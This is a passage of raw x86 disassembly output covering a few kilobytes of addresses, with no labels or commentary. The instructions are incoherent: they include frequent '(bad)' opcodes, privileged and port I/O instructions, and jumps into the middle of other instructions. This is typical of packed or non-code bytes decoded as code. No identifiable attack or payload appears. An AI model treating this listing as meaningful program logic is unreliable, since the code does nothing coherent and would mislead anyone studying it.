  4117e8:	and    BYTE PTR [eax+0x4c84e19e],bh
  4117ee:	jno    0x411806
  4117f0:	pushf  
  4117f1:	inc    edx
  4117f2:	dec    esp
  4117f3:	cmp    BYTE PTR [ecx+0x34362fad],dh
  4117f9:	cmc    
  4117fa:	xlat   BYTE PTR ds:[ebx]
  4117fb:	lods   al,BYTE PTR ds:[esi]
  4117fc:	mov    fs,ecx
  4117fe:	hlt    
  4117ff:	mov    ebx,0x4fe1d312
  411804:	jbe    0x4117ad
  411806:	js     0x4117de
  411808:	sbb    eax,0xc45447e
  41180d:	fdivr  DWORD PTR [eax+0x79cf49c0]
  411813:	lea    edx,ds:0x93b29ec3
  411819:	into   
  41181a:	push   edi
  41181b:	cdq    
  41181c:	inc    ebp
  41181d:	daa    
  41181e:	push   ebp
  41181f:	icebp  
  411820:	repnz mov ch,0x23
  411823:	adc    al,ah
  411825:	xchg   esp,eax
  411826:	pusha  
  411827:	in     eax,dx
  411828:	mov    al,0x3a
  41182a:	aam    0x74
  41182c:	lods   eax,DWORD PTR ds:[esi]
  41182d:	xor    BYTE PTR [eax+0x43d08365],bh
  411833:	mov    bh,0x89
  411835:	ret    0x53f1
  411838:	adc    DWORD PTR [esi+eax*1],ebx
  41183b:	loope  0x411811
  41183d:	push   edx
  41183e:	pop    ebx
  41183f:	lock aad 0xec
  411842:	inc    edx
  411843:	jnp    0x4117d0
  411845:	inc    ecx
  411846:	push   0x95607783
  41184b:	leave  
  41184c:	add    BYTE PTR [ebp-0x287a916a],ah
  411852:	mov    esi,ss
  411854:	pop    es
  411855:	ins    BYTE PTR es:[edi],dx
  411856:	xchg   BYTE PTR [edx],cl
  411858:	push   ds
  411859:	inc    ebx
  41185a:	fldcw  WORD PTR [ebx]
  41185c:	mov    ecx,0x926192b3
  411861:	cmp    DWORD PTR [ecx+0x799b6829],esp
  411867:	int3   
  411868:	ss out dx,al
  41186a:	je     0x41186c
  41186c:	mov    esi,0x19f0fb8
  411871:	sbb    DWORD PTR [ebp+0x299f58c6],edi
  411877:	ss jne 0x41184e
  41187a:	jl     0x411846
  41187c:	fcmovne st,st(3)
  41187e:	inc    edx
  41187f:	pop    es
  411880:	push   0x5a
  411882:	mov    edi,0xd4fe6765
  411887:	mov    eax,0x99bff737
  41188c:	aas    
  41188d:	and    eax,0x40
  411890:	jb     0x4118ad
  411892:	mov    ds:0xba49f930,al
  411897:	out    dx,eax
  411898:	push   DWORD PTR ds:0x8891a3a
  41189e:	sub    ebp,DWORD PTR [ecx]
  4118a0:	and    bl,dh
  4118a2:	in     eax,0xce
  4118a4:	mov    bl,0xc
  4118a6:	neg    DWORD PTR [edi+0x48]
  4118a9:	mov    eax,0x7db89ec5
  4118ae:	enter  0xb06b,0x65
  4118b2:	push   esp
  4118b3:	cmp    esi,DWORD PTR [edi*4+0x47cd2679]
  4118ba:	mov    BYTE PTR [eax+ebx*2+0x1a],al
  4118be:	xor    al,0x15
  4118c0:	add    bl,BYTE PTR [ebp-0x7a41493e]
  4118c6:	jbe    0x411907
  4118c8:	js     0x411913
  4118ca:	sti    
  4118cb:	dec    esp
  4118cc:	int    0x3e
  4118ce:	lea    esi,[ecx]
  4118d0:	jo     0x411895
  4118d2:	mov    edx,0x170a2714
  4118d7:	mov    DWORD PTR [ebx],eax
  4118d9:	stc    
  4118da:	add    DWORD PTR [esp+eiz*8+0x27],esi
  4118de:	dec    esp
  4118df:	push   0x71
  4118e1:	jb     0x411912
  4118e3:	daa    
  4118e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118e5:	neg    ah
  4118e7:	es ja  0x41190b
  4118ea:	add    DWORD PTR [eax+0x47],ecx
  4118ed:	mov    dl,0x15
  4118ef:	dec    BYTE PTR [esi+0x28]
  4118f2:	cmp    BYTE PTR [esi-0x360fbc67],ah
  4118f8:	sub    BYTE PTR [edx],al
  4118fa:	xlat   BYTE PTR ds:[ebx]
  4118fb:	jmp    0x4118ca
  4118fd:	f2xm1  
  4118ff:	adc    BYTE PTR [edi+0x7aefd4e6],al
  411905:	mov    bl,0x55
  411907:	dec    ecx
  411908:	arpl   WORD PTR [edi],cx
  41190a:	cmp    ebp,ebx
  41190c:	pop    ds
  41190d:	xchg   esp,eax
  41190e:	mov    ecx,0x10787a2
  411913:	inc    edi
  411914:	pop    esp
  411915:	push   0x89c1ff23
  41191a:	data16 test ah,ch
  41191d:	push   0xec9248f3
  411922:	mov    BYTE PTR [ecx-0x46bead21],bh
  411928:	mov    esi,0xaeabe16
  41192d:	jl     0x411928
  41192f:	jecxz  0x41199f
  411931:	out    dx,al
  411932:	aas    
  411933:	cmp    eax,0xd2a8b356
  411938:	fst    DWORD PTR ds:0xb284a7cd
  41193e:	push   ebx
  41193f:	fidiv  WORD PTR [edx+0x3a]
  411942:	cld    
  411943:	fdivr  DWORD PTR [ebp+esi*8-0x2e]
  411947:	dec    ebx
  411948:	repnz pop eax
  41194a:	sub    DWORD PTR [esi-0x13],ebp
  41194d:	int3   
  41194e:	pop    edx
  41194f:	mov    esi,0x3f638bc2
  411954:	push   ds
  411955:	mov    ds:0x3a7c441,eax
  41195a:	sub    ah,BYTE PTR [edi+0x4]
  41195d:	outs   dx,DWORD PTR ds:[esi]
  41195e:	or     dl,al
  411960:	sub    al,0x7c
  411962:	mov    dl,0x9f
  411964:	scas   al,BYTE PTR es:[edi]
  411965:	push   esp
  411966:	aad    0x4b
  411968:	inc    edi
  411969:	imul   edx,DWORD PTR [edx-0x17],0xffffffcb
  41196d:	dec    edi
  41196e:	repnz cmp DWORD PTR [eax-0x32d12a7e],ebx
  411975:	test   DWORD PTR [ecx],edi
  411977:	inc    ecx
  411978:	test   DWORD PTR [eax],ebx
  41197a:	and    eax,0x4f0890de
  41197f:	dec    esp
  411980:	cwde   
  411981:	imul   esi,esi,0xffffffe4
  411984:	or     eax,esi
  411986:	(bad)  
  411987:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411988:	pop    ebp
  411989:	jp     0x4119a7
  41198b:	pop    ebx
  41198c:	jp     0x4119ae
  41198e:	aaa    
  41198f:	(bad)  
  411990:	nop
  411991:	sub    bh,dl
  411993:	es mov esp,0xf7222789
  411999:	int3   
  41199a:	test   eax,0x1b918f77
  41199f:	out    0xff,al
  4119a1:	jle    0x411995
  4119a3:	push   ecx
  4119a4:	outs   dx,DWORD PTR ds:[esi]
  4119a5:	push   esi
  4119a6:	pop    edi
  4119a7:	sahf   
  4119a8:	daa    
  4119a9:	inc    edi
  4119aa:	je     0x411a0a
  4119ac:	aam    0x5c
  4119ae:	jne    0x411a24
  4119b0:	or     BYTE PTR [eax+0x230d481b],al
  4119b6:	es jmp 0xba26:0xbd49137c
  4119be:	mov    ah,0x6c
  4119c0:	push   ss
  4119c1:	int3   
  4119c2:	add    DWORD PTR [edx-0x43],0x951432be
  4119c9:	xchg   edx,eax
  4119ca:	ret    
  4119cb:	icebp  
  4119cc:	and    ebp,edi
  4119ce:	inc    ecx
  4119cf:	(bad)  
  4119d0:	pop    ecx
  4119d1:	and    al,0xbf
  4119d3:	xchg   esi,eax
  4119d4:	loope  0x4119cb
  4119d6:	ret    0x11ec
  4119d9:	push   ecx
  4119da:	cmp    BYTE PTR [edi],0x50
  4119dd:	xor    BYTE PTR [ebx-0x64],dl
  4119e0:	jge    0x4119a2
  4119e2:	or     eax,0xc6c43aed
  4119e7:	dec    edx
  4119e8:	jo     0x411a1b
  4119ea:	(bad)  
  4119eb:	aam    0x14
  4119ed:	mov    ds,ebp
  4119ef:	mov    ebp,0x5c44b884
  4119f4:	sar    BYTE PTR [eax-0x5cdd390c],0x1c
  4119fb:	inc    esi
  4119fc:	xchg   BYTE PTR [edi+0x23647897],bh
  411a02:	push   0x32
  411a04:	popf   
  411a05:	fmul   st(4),st
  411a07:	int    0xfb
  411a09:	pushf  
  411a0a:	pop    ebx
  411a0b:	pop    ss
  411a0c:	inc    esi
  411a0d:	xchg   ecx,eax
  411a0e:	pop    eax
  411a0f:	push   0x772b4ec6
  411a14:	and    eax,0xb91c02be
  411a19:	(bad)  
  411a1a:	(bad)  
  411a1b:	pop    edi
  411a1c:	mov    esp,0x58204364
  411a21:	sub    esi,DWORD PTR [eax+0x15]
  411a24:	mov    esi,DWORD PTR [edi]
  411a26:	and    al,0x32
  411a28:	xchg   edi,eax
  411a29:	cmp    eax,0xdd92bcd9
  411a2e:	sub    BYTE PTR [edx],ah
  411a30:	mov    edx,0xfab56c5a
  411a35:	dec    edx
  411a36:	push   es
  411a37:	nop
  411a38:	and    ch,BYTE PTR [eax+ecx*4-0x34]
  411a3c:	fadd   QWORD PTR [eax-0x5e]
  411a3f:	out    0x74,eax
  411a41:	push   edi
  411a42:	mov    ah,0x50
  411a44:	daa    
  411a45:	je     0x411a4b
  411a47:	dec    edx
  411a48:	ins    BYTE PTR es:[edi],dx
  411a49:	sub    DWORD PTR ds:0x7ca55240,0xfffda823
  411a53:	sbb    DWORD PTR [edi+edi*1],edx
  411a56:	and    BYTE PTR [eax],dh
  411a58:	sbb    eax,0xed3fd1ea
  411a5d:	ins    BYTE PTR es:[edi],dx
  411a5e:	es xchg edx,eax
  411a60:	push   0xdbca4384
  411a65:	nop
  411a66:	cmp    cl,BYTE PTR [eax]
  411a68:	arpl   WORD PTR [eax-0x1848c724],si
  411a6e:	adc    BYTE PTR [edx],ah
  411a70:	push   ss
  411a71:	dec    esp
  411a72:	xor    esp,DWORD PTR [edi+0x4e75dd6a]
  411a78:	and    BYTE PTR [esi*4+0x6059cbe6],0xe5
  411a80:	pop    ds
  411a81:	cmc    
  411a82:	mov    BYTE PTR [ebx],al
  411a84:	push   esi
  411a85:	dec    ebx
  411a86:	imul   ebx,DWORD PTR [edi-0xd],0xa4db99da
  411a8d:	lahf   
  411a8e:	push   0xfffffff0
  411a90:	cmp    al,0x46
  411a92:	mov    DWORD PTR [ebx+0x7b],esi
  411a95:	cwde   
  411a96:	int3   
  411a97:	or     cl,dh
  411a99:	mov    ebp,0xce0b5a65
  411a9e:	push   esp
  411a9f:	sub    BYTE PTR [esi+0x69],ch
  411aa2:	lahf   
  411aa3:	sbb    DWORD PTR [esi+0x27df523a],ebp
  411aa9:	test   al,0xc3
  411aab:	xchg   esi,eax
  411aac:	icebp  
  411aad:	loopne 0x411b19
  411aaf:	aaa    
  411ab0:	and    DWORD PTR [esi+0x77],esp
  411ab3:	xchg   dh,bl
  411ab5:	out    dx,eax
  411ab6:	dec    ecx
  411ab7:	aas    
  411ab8:	hlt    
  411ab9:	sbb    al,0x2
  411abb:	adc    eax,0x507c8d3a
  411ac0:	jne    0x411af4
  411ac2:	out    dx,al
  411ac3:	jl     0x411a94
  411ac5:	fmul   DWORD PTR [edi+0x3159e29d]
  411acb:	(bad)  
  411acc:	les    ebx,FWORD PTR [esp+esi*2+0x23c980e0]
  411ad3:	sbb    ch,BYTE PTR [ebx-0x59]
  411ad6:	add    edi,edi
  411ad8:	and    DWORD PTR [edi],ebx
  411ada:	inc    ebx
  411adc:	in     al,dx
  411add:	retf   
  411ade:	in     al,0x9c
  411ae0:	into   
  411ae1:	fcomp  DWORD PTR [ebp-0x67]
  411ae4:	xor    ecx,edx
  411ae6:	cmp    DWORD PTR [edi-0x2608b331],esp
  411aec:	xchg   ebp,eax
  411aed:	inc    ebx
  411aee:	rcl    DWORD PTR cs:[eax-0x68],cl
  411af2:	and    DWORD PTR [esi-0x11],eax
  411af5:	mov    edx,0xe0fb4ddf
  411afa:	and    eax,0xc9104e90
  411aff:	call   0x1dc9:0xb70cbf1
  411b06:	inc    esp
  411b07:	data16 in al,dx
  411b09:	sbb    dh,ch
  411b0b:	fld    QWORD PTR [ebp+edi*4-0x25]
  411b0f:	inc    esi
  411b10:	outs   dx,DWORD PTR ds:[esi]
  411b11:	in     eax,0x1b
  411b13:	push   edi
  411b14:	mov    eax,ds:0xddbf9919
  411b19:	add    bh,BYTE PTR [eax-0x76fda3b2]
  411b1f:	scas   al,BYTE PTR es:[edi]
  411b20:	adc    DWORD PTR [ebx],esi
  411b22:	dec    esp
  411b23:	pop    esp
  411b24:	dec    ecx
  411b25:	outs   dx,DWORD PTR ds:[esi]
  411b26:	sub    BYTE PTR [edi+ecx*8+0x6],bl
  411b2a:	dec    eax
  411b2b:	mov    ch,0xec
  411b2d:	mov    esp,0x1d3dd415
  411b32:	iret   
  411b33:	xchg   edi,eax
  411b34:	call   0x5314:0x72e0d0e9
  411b3b:	test   eax,0x902dea90
  411b40:	ins    DWORD PTR es:[edi],dx
  411b41:	imul   ebx,DWORD PTR [ebx],0xf7b24db2
  411b47:	add    ax,0xc93b
  411b4b:	mov    eax,ss
  411b4d:	sub    DWORD PTR [ecx+0x5ac88138],ecx
  411b53:	pop    ds
  411b54:	fbstp  TBYTE PTR [edi]
  411b56:	add    BYTE PTR [edx-0x7e],0x9a
  411b5a:	shl    DWORD PTR [esp+esi*1],0x1
  411b5e:	jg     0x411bba
  411b60:	int3   
  411b61:	and    al,0x8c
  411b63:	outs   dx,BYTE PTR ds:[esi]
  411b64:	mov    bl,0xd1
  411b66:	push   ebp
  411b67:	add    cl,BYTE PTR [edi-0x46]
  411b6a:	mov    bh,dl
  411b6c:	test   DWORD PTR [esi+edx*8+0x324cbfc],ecx
  411b73:	sub    eax,0x19a46273
  411b78:	fs dec eax
  411b7a:	jl     0x411be5
  411b7c:	outs   dx,DWORD PTR ds:[esi]
  411b7d:	xchg   DWORD PTR [eax+0x2b9f3cf6],ebx
  411b83:	dec    ebp
  411b84:	pop    esi
  411b85:	push   ss
  411b86:	pop    ecx
  411b87:	jmp    0x411b19
  411b89:	ret    
  411b8a:	or     ebx,DWORD PTR [ebp+ecx*1-0x40]
  411b8e:	bound  edi,QWORD PTR [eax-0x67]
  411b91:	push   edi
  411b92:	mov    dl,BYTE PTR [eax-0x72a55401]
  411b98:	pushf  
  411b99:	xchg   esi,eax
  411b9a:	inc    edi
  411b9b:	in     eax,0x3e
  411b9d:	xor    DWORD PTR ds:0xae5b470c,eax
  411ba3:	adc    al,0x48
  411ba5:	or     al,0x43
  411ba7:	rcl    BYTE PTR [edi],0xe1
  411baa:	ficom  DWORD PTR [esi]
  411bac:	in     eax,dx
  411bad:	fcmovnu st,st(2)
  411baf:	jbe    0x411c0b
  411bb1:	cwde   
  411bb2:	test   BYTE PTR [edi+0x444d414],bh
  411bb8:	push   cs
  411bb9:	push   es
  411bba:	push   0xffffffc0
  411bbc:	push   cs
  411bbd:	(bad)  
  411bbe:	in     al,0xc4
  411bc0:	mov    eax,ds:0xec207bd7
  411bc5:	xchg   DWORD PTR [esi-0x6b3013ec],edi
  411bcb:	mov    al,0x69
  411bcd:	jecxz  0x411c37
  411bcf:	pop    ecx
  411bd0:	jge    0x411c12
  411bd2:	or     al,0x1e
  411bd4:	idiv   BYTE PTR [ebp+0x6c]
  411bd7:	test   ebp,ecx
  411bd9:	in     eax,dx
  411bda:	xor    ebp,DWORD PTR [edx+0xe]
  411bdd:	dec    esp
  411bde:	es push esi
  411be0:	mov    ah,BYTE PTR [ecx+0x5b]
  411be3:	mov    ebp,0xa8035baa
  411be8:	hlt    
  411be9:	dec    ecx
  411bea:	jmp    0x411bfd
  411bec:	mov    dl,0x36
  411bee:	add    dl,BYTE PTR [ebp-0x7d009678]
  411bf4:	or     WORD PTR [ebx-0x4f],cx
  411bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bf9:	ins    DWORD PTR es:[edi],dx
  411bfa:	int    0xe9
  411bfc:	mov    si,0x9429
  411c00:	retf   
  411c01:	mov    cl,0x84
  411c03:	sbb    al,0xe7
  411c05:	repz add al,bl
  411c08:	test   eax,0x911bcf84
  411c0d:	stos   DWORD PTR es:[edi],eax
  411c0e:	pushf  
  411c0f:	lock and BYTE PTR [ebp-0x205d8a27],ah
  411c16:	pop    eax
  411c17:	jbe    0x411c1d
  411c19:	adc    eax,DWORD PTR [edi-0x2b29c14c]
  411c1f:	pop    ebp
  411c20:	(bad)  
  411c21:	cli    
  411c22:	aaa    
  411c23:	mov    edx,0x8d7eac46
  411c28:	fxam   
  411c2a:	and    al,0x3e
  411c2c:	call   0x269eda73
  411c31:	clc    
  411c32:	inc    ebx
  411c33:	xor    eax,DWORD PTR [ebp+0x36]
  411c36:	or     BYTE PTR [edx-0x4dac798b],al
  411c3c:	jge    0x411c5f
  411c3e:	mov    ds:0x2ad7026f,al
  411c43:	jle    0x411c47
  411c45:	sub    al,0xb3
  411c47:	mov    bl,0x86
  411c49:	ficom  WORD PTR [eax+0x9bd7a58]
  411c4f:	ja     0x411be1
  411c51:	(bad)  
  411c52:	out    0xba,eax
  411c54:	jp     0x411bfa
  411c56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c57:	inc    esp
  411c58:	stc    
  411c59:	and    BYTE PTR [ebp-0x5c],ch
  411c5c:	outs   dx,BYTE PTR ds:[esi]
  411c5d:	push   0xcfd39e33
  411c62:	scas   eax,DWORD PTR es:[edi]
  411c63:	pop    edi
  411c64:	add    al,0xdb
  411c66:	jmp    0x411c50
  411c68:	fild   QWORD PTR [ecx+0x536ce810]
  411c6e:	pop    ds
  411c6f:	xor    al,0xc1
  411c71:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  411c73:	cli    
  411c74:	cmc    
  411c75:	das    
  411c76:	pop    ebp
  411c77:	sti    
  411c78:	in     al,dx
  411c79:	or     esi,DWORD PTR [eax-0x44728c4]
  411c7f:	in     eax,0xb5
  411c81:	add    al,0x5
  411c83:	fistp  WORD PTR [esi-0x2435164b]
  411c89:	cs push ss
  411c8b:	fst    DWORD PTR [edi-0x29c6a846]
  411c91:	jo     0x411cfd
  411c93:	xchg   edx,eax
  411c94:	dec    edx
  411c95:	sbb    DWORD PTR [ebx-0x6f],eax
  411c98:	mov    ecx,0xf080acbb
  411c9d:	ins    BYTE PTR es:[edi],dx
  411c9e:	sbb    DWORD PTR [edx],0xffffffb9
  411ca1:	fs xor al,0x36
  411ca4:	cmp    esp,DWORD PTR [eax]
  411ca6:	mov    eax,0xfb0a692f
  411cab:	arpl   cx,sp
  411cad:	clc    
  411cae:	mov    al,ds:0xd90787b9
  411cb3:	enter  0xef2b,0x30
  411cb7:	into   
  411cb8:	add    DWORD PTR [ebp+0xf95da6d],edx
  411cbe:	pop    esp
  411cbf:	pop    eax
  411cc0:	std    
  411cc1:	iret   
  411cc2:	sbb    DWORD PTR [esi+0xe],esi
  411cc5:	adc    eax,0x58eb3ece
  411cca:	pop    esp
  411ccb:	push   esp
  411ccc:	dec    edx
  411ccd:	ret    
  411cce:	fxch   st(5)
  411cd0:	cmp    esi,DWORD PTR [edx+0xc]
  411cd3:	xchg   edi,eax
  411cd4:	pop    ecx
  411cd5:	pop    eax
  411cd6:	mov    cl,0xed
  411cd8:	jl     0x411cd4
  411cda:	and    esp,DWORD PTR [eax]
  411cdc:	test   BYTE PTR ds:0x19f95335,dl
  411ce2:	mov    ecx,0xc40e6475
  411ce7:	mov    ebp,0x2258d338
  411cec:	mov    bl,0xb
  411cee:	mov    edx,0x379405bf
  411cf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cf4:	sub    eax,0x1ad941d4
  411cf9:	pop    es
  411cfa:	mov    esp,0xbd983077
  411cff:	adc    DWORD PTR [ebx],edi
  411d01:	cmp    BYTE PTR [edi],bl
  411d03:	rcr    BYTE PTR [edx-0x79e8948f],cl
  411d09:	mov    ch,0x1a
  411d0b:	xor    BYTE PTR [edi-0x7931ecbd],cl
  411d11:	cmovo  ebx,DWORD PTR [ecx]
  411d14:	mov    al,ds:0x79d77883
  411d19:	push   ebp
  411d1a:	xchg   esp,eax
  411d1b:	rcl    DWORD PTR [ecx],1
  411d1d:	mov    ah,0x46
  411d1f:	hlt    
  411d20:	jne    0x411d4a
  411d22:	pop    ds
  411d23:	and    eax,0xbb2dc442
  411d28:	lds    ecx,FWORD PTR [edi]
  411d2a:	hlt    
  411d2b:	stos   BYTE PTR es:[edi],al
  411d2c:	pcmpeqb mm0,QWORD PTR [esi+0x3f]
  411d30:	pusha  
  411d31:	pop    ecx
  411d32:	jo     0x411da0
  411d34:	jl     0x411d69
  411d36:	push   es
  411d37:	adc    BYTE PTR [ebp-0x30],ch
  411d3a:	les    edi,FWORD PTR [ebp-0x20]
  411d3d:	jno    0x411db2
  411d3f:	pop    ebp
  411d40:	js     0x411ce0
  411d42:	jge    0x411d88
  411d44:	retf   
  411d45:	mov    eax,ds:0xa393aeef
  411d4a:	mov    al,0x6c
  411d4c:	mov    ds:0xeb52bf04,al
  411d51:	retf   0x7b83
  411d54:	xchg   esi,eax
  411d55:	mov    ecx,0x7560640f
  411d5a:	neg    edi
  411d5c:	rcl    WORD PTR [eax+0x1d4a31e0],1
  411d63:	jle    0x411de1
  411d65:	mov    al,ds:0xefa16665
  411d6a:	mov    ecx,0xf8254d00
  411d6f:	hlt    
  411d70:	cmp    BYTE PTR [ebp+0x729ea024],ah
  411d76:	cwde   
  411d77:	dec    esp
  411d78:	mov    eax,0x4454b87c
  411d7d:	adc    bl,BYTE PTR [esi]
  411d7f:	mov    bl,0x4a
  411d81:	fadd   QWORD PTR [ebp-0x52]
  411d84:	jno    0x411dac
  411d86:	mov    fs,WORD PTR [edi+0x29f2ab24]
  411d8c:	dec    ebx
  411d8d:	push   esp
  411d8e:	inc    eax
  411d8f:	mov    edi,DWORD PTR ds:0x2299e652
  411d95:	jp     0x411dfd
  411d97:	dec    esp
  411d98:	lods   eax,DWORD PTR ds:[esi]
  411d99:	mov    cl,0x57
  411d9b:	cmp    DWORD PTR [esi],0x77
  411d9e:	xchg   esp,eax
  411d9f:	repz cmp esp,DWORD PTR [ebx]
  411da2:	xor    esp,ebp
  411da4:	and    eax,edx
  411da6:	adc    dh,cl
  411da8:	xor    cl,ah
  411daa:	xchg   DWORD PTR [eax+0x5e],edx
  411dad:	add    ah,BYTE PTR [eax+ebp*4]
  411db0:	pop    edi
  411db1:	mov    ds:0xeaca738d,al
  411db6:	push   cs
  411db7:	xchg   ecx,eax
  411db8:	repz loop 0x411da6
  411dbb:	push   eax
  411dbc:	push   edi
  411dbd:	jne    0x411e1b
  411dbf:	neg    BYTE PTR [eax-0x596bc997]
  411dc5:	jns    0x411d82
  411dc7:	retf   0x3670
  411dca:	aam    0x24
  411dcc:	popa   
  411dcd:	stc    
  411dce:	popf   
  411dcf:	xchg   edx,eax
  411dd0:	or     al,0x85
  411dd2:	dec    ebx
  411dd3:	mov    dh,0x11
  411dd5:	(bad)  
  411dd6:	fidiv  WORD PTR [edx+0x72]
  411dd9:	jns    0x411d8a
  411ddb:	adc    al,0x2c
  411ddd:	inc    ecx
  411dde:	xor    edx,0x7fd1dfe0
  411de4:	jl     0x411dc6
  411de6:	int    0xfc
  411de8:	cmp    al,0x37
  411dea:	pop    ebp
  411deb:	sub    al,0x18
  411ded:	imul   esi,esi,0xffffffc1
  411df0:	dec    edx
  411df1:	push   edi
  411df2:	jae    0x411dbb
  411df4:	call   0x949d3e0f
  411df9:	dec    ecx
  411dfa:	lds    esp,FWORD PTR [edx-0xadb9dff]
  411e00:	pop    ss
  411e01:	pop    esi
  411e02:	icebp  
  411e03:	cmp    eax,0x44564194
  411e08:	sub    bh,BYTE PTR [edi]
  411e0a:	mov    ch,0x0
  411e0c:	jl     0x411db7
  411e0e:	mov    WORD PTR [eax+ebp*4+0x50076bbb],cs
  411e15:	and    DWORD PTR [ebx],0xffffffc7
  411e18:	leave  
  411e19:	enter  0xa073,0xaf
  411e1d:	cmc    
  411e1e:	mov    es,WORD PTR [edx-0x38fdbd3b]
  411e24:	mov    esp,0xdb977b0b
  411e29:	fistp  DWORD PTR [esi+0x16980fef]
  411e2f:	outs   dx,DWORD PTR ds:[esi]
  411e30:	inc    edx
  411e31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e32:	xor    ebx,esp
  411e34:	dec    ebp
  411e35:	daa    
  411e36:	dec    ecx
  411e38:	aam    0xfb
  411e3a:	inc    edi
  411e3b:	mov    es,WORD PTR [esi]
  411e3d:	cmc    
  411e3e:	test   eax,0xee3f9204
  411e43:	inc    esi
  411e44:	nop
  411e45:	out    dx,al
  411e46:	rep outs dx,BYTE PTR ds:[esi]
  411e48:	ret    
  411e49:	int3   
  411e4a:	cwde   
  411e4b:	in     al,dx
  411e4c:	mov    ds:0x2e31b6ba,eax
  411e51:	xor    edi,DWORD PTR [eax-0x7b]
  411e54:	outs   dx,BYTE PTR ds:[esi]
  411e55:	xchg   DWORD PTR ss:[esi+ebx*2+0x4ea9533f],esi
  411e5d:	nop
  411e5e:	dec    esp
  411e5f:	sbb    ah,BYTE PTR [ecx+0x30]
  411e62:	lahf   
  411e63:	and    bl,BYTE PTR [edx]
  411e65:	fist   DWORD PTR [edx+0x58403048]
  411e6b:	xchg   edi,eax
  411e6c:	sbb    bh,BYTE PTR [bx+si+0x7c]
  411e70:	mov    eax,ds:0x21cc2afb
  411e75:	or     esp,ebp
  411e77:	les    eax,FWORD PTR [ecx+edi*1+0x2b591cbb]
  411e7e:	mov    esi,0x1316e3c0
  411e83:	scas   al,BYTE PTR es:[edi]
  411e84:	cld    
  411e85:	outs   dx,BYTE PTR ds:[esi]
  411e86:	ss loop 0x411ebd
  411e89:	fcomp  QWORD PTR [ebp-0x2a2babab]
  411e8f:	add    ch,BYTE PTR [esi-0x3144413c]
  411e95:	jle    0x411ef1
  411e97:	not    BYTE PTR [edi]
  411e99:	mov    ebp,0x5dfd234a
  411e9e:	sbb    edi,DWORD PTR [esi+esi*8]
  411ea1:	outs   dx,DWORD PTR ds:[esi]
  411ea2:	shr    BYTE PTR [ecx+0x68],1
  411ea5:	add    bh,BYTE PTR [ebx-0x3a3d67a2]
  411eab:	and    bl,BYTE PTR [esi-0x5]
  411eae:	and    DWORD PTR [ebx+0x14],0xc6e3668c
  411eb5:	sub    eax,0x5fce5fa2
  411eba:	rol    DWORD PTR [ebx],cl
  411ebc:	push   0xffffffe8
  411ebe:	sub    edx,esp
  411ec0:	data16 jae 0x411f1c
  411ec3:	mov    al,0xb
  411ec5:	cmp    eax,0xd31d2b66
  411eca:	and    al,0x97
  411ecc:	xchg   edi,eax
  411ecd:	sub    ebx,ebx
  411ecf:	test   BYTE PTR [esi+eiz*2+0x70],al
  411ed3:	dec    eax
  411ed4:	ins    BYTE PTR es:[edi],dx
  411ed5:	mov    al,0x9
  411ed7:	stos   DWORD PTR es:[edi],eax
  411ed8:	sbb    ebp,DWORD PTR [ebx-0x34]
  411edb:	stos   DWORD PTR es:[edi],eax
  411edc:	dec    esp
  411edd:	cwde   
  411ede:	(bad)  
  411edf:	jmp    0x411f42
  411ee1:	pop    esp
  411ee2:	pop    esp
  411ee3:	or     eax,0x1c9dbca0
  411ee8:	inc    ebx
  411ee9:	int3   
  411eea:	mov    bl,0xda
  411eec:	xchg   DWORD PTR [eax],edx
  411eee:	cli    
  411eef:	ret    
  411ef0:	ins    BYTE PTR es:[edi],dx
  411ef1:	loope  0x411eab
  411ef3:	lock cdq 
  411ef5:	(bad)
  411efa:	arpl   WORD PTR [ebx-0x76fbfe55],bp
  411f00:	jg     0x411f48
  411f02:	and    al,0xb3
  411f04:	mov    bl,0x1a
  411f06:	rcl    DWORD PTR [eax],cl
  411f08:	sahf   
  411f09:	ror    esi,1
  411f0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f0c:	xchg   edx,eax
  411f0d:	(bad)  
  411f0e:	sbb    BYTE PTR [ebp+0x26],bl
  411f11:	and    eax,0x2249f2c5
  411f16:	arpl   WORD PTR [eax],di
  411f18:	push   edi
  411f19:	adc    al,0xe
  411f1b:	aaa    
  411f1c:	scas   eax,DWORD PTR es:[edi]
  411f1d:	in     al,0xe5
  411f1f:	add    BYTE PTR [ecx+0x43],0xd3
  411f23:	inc    ecx
  411f24:	jg     0x411eb6
  411f26:	dec    esi
  411f27:	inc    edx
  411f28:	mov    bl,ah
  411f2a:	pusha  
  411f2b:	jbe    0x411eb9
  411f2d:	pop    ebp
  411f2e:	nop
  411f2f:	cmp    edi,DWORD PTR [ecx+0x2e]
  411f32:	jbe    0x411eee
  411f34:	int    0xb1
  411f36:	fwait
  411f37:	cs push ebx
  411f39:	add    ch,BYTE PTR [ebp+0x211a79f1]
  411f3f:	je     0x411ed1
  411f41:	leave  
  411f42:	cmp    BYTE PTR [ebp-0x7cf10c2],ch
  411f48:	xor    al,0xb
  411f4a:	mov    ecx,0x6bb06f97
  411f4f:	adc    DWORD PTR ds:0xf661de1a,ecx
  411f55:	adc    BYTE PTR [edx-0x14],dh
  411f58:	xchg   esi,eax
  411f59:	lahf   
  411f5a:	outs   dx,DWORD PTR ds:[esi]
  411f5b:	(bad)  [ebp+eax*2+0x4e0b3bb2]
  411f62:	sub    dl,BYTE PTR [ebx]
  411f64:	xor    edx,DWORD PTR [edi+ebp*1-0x4b]
  411f68:	dec    esi
  411f69:	or     eax,0xdc4d37e5
  411f6e:	xor    eax,0xfb6add47
  411f73:	popf   
  411f74:	out    dx,al
  411f75:	sub    eax,0xe605e483
  411f7a:	out    0x69,al
  411f7c:	mov    ecx,0xf47843b8
  411f81:	xchg   DWORD PTR fs:[esi-0x5766656],ecx
  411f88:	outs   dx,DWORD PTR ds:[esi]
  411f89:	shl    BYTE PTR [edi+0x3d175eb5],cl
  411f8f:	lahf   
  411f90:	dec    esp
  411f91:	xor    BYTE PTR [ebx],ch
  411f93:	push   edi
  411f94:	push   ss
  411f95:	sbb    esp,esp
  411f97:	inc    edi
  411f98:	cdq    
  411f99:	inc    edi
  411f9a:	sbb    DWORD PTR [edi],edi
  411f9c:	gs cmc 
